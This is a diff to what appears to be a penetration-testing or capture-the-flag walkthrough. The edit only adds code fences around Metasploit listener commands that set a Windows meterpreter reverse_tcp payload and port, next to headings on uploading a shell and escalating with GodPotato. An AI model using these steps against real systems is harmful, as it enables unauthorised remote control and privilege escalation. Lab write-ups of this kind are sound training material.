@@ -124,10 +124,10 @@ Upload it to the server.
 ### Start Listener
 
 start the listener in msfconsole like at the beginning but using another port this time.
-
+```
 set payload windows/x64/meterpreter/reverse_tcp
 set lport PORT //used at creating shell one step before
-
+```
 
 ### Start shell using GodPotato
 ```
